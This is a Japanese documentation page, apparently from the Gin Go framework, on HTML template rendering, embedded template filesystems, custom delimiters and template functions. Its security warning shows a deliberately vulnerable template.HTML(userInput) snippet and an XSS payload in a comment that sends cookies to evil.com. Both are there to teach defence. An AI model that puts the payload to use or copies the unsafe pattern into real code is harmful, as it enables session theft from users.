---
title: "HTMLレンダリング"
sidebar:
  order: 9
---

Ginは[html/template](https://pkg.go.dev/html/template)パッケージをHTMLレンダリングに使用しています。
利用可能なプレースホルダーを含む使い方の詳細については、[text/template](https://pkg.go.dev/text/template)のドキュメントを参照してください。

LoadHTMLGlob()またはLoadHTMLFiles()を使用して、読み込むHTMLファイルを選択します。

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

異なるディレクトリで同じ名前のテンプレートを使用する

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**注意：** HTMLテンプレートを`{{define <template-path>}} {{end}}`ブロックでラップし、テンプレートファイルを相対パス`<template-path>`で定義してください。そうしないと、GINはテンプレートファイルを正しくパースできません。

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### http.FileSystemからのテンプレート読み込み（v1.11以降）

テンプレートが埋め込まれているか、`http.FileSystem`から提供される場合は、`LoadHTMLFS`を使用します：

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### セキュリティ警告：`template.HTML()`は自動エスケープをバイパスする

Goの`html/template`パッケージは、クロスサイトスクリプティング（XSS）を防ぐため、テンプレートに挿入される値を自動的にエスケープします。しかし、文字列を`template.HTML()`にキャストすると、この保護を明示的にバイパスすることになります。文字列にユーザー提供の入力が含まれている場合、攻撃者は任意のJavaScriptを注入できます。

**安全でない -- ユーザー入力で`template.HTML()`を使用しないでください：**

```go
// 危険：攻撃者がuserInputを制御しており、次のような値になり得ます：
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS脆弱性！
})
```

**安全 -- テンプレートエンジンにユーザー入力を自動的にエスケープさせる：**

```go
// 安全：html/templateがuserInput内のHTML/JSをエスケープします
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // html/templateで自動エスケープ
})
```

`template.HTML()`は、自分のコード内で定義された静的HTMLスニペットなど、完全に制御しているコンテンツにのみ使用してください。ユーザー入力、ユーザーが入力したデータベースフィールド、その他の信頼できないソースからの値には決して使用しないでください。

### カスタムテンプレートレンダラー

独自のHTMLテンプレートレンダラーを使用することもできます。

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### カスタムデリミタ

カスタムデリミタを使用できます。

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### カスタムテンプレート関数

詳細は[サンプルコード](https://github.com/gin-gonic/examples/tree/master/template)をご覧ください。

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

結果：

```sh
Date: 2017/07/01
```
